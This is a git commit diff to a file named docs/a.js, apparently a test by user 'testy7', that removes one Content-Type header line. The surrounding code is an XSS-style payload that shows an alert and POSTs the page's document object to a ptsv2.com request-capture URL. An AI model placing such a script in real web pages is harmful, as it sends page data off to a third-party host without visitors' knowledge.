ada2c1ccf71f70c32a4661a43d251c1d8eba0dab
testy7 <97352957+testy7@users.noreply.github.com>
2022-01-08 17:49:23 +0100

    Update a.js

--- docs/a.js
+++ docs/a.js
@@ -2,6 +2,5 @@
 alert(document);
 var xhr = new XMLHttpRequest();
 xhr.open("POST", 'https://ptsv2.com/t/fyrw2-1641653611/post', true);
-xhr.setRequestHeader('Content-Type', 'application/json');
 xhr.setRequestHeader('Access-Control-Allow-Origin', 'https://ptsv2.com');
 xhr.send(document);
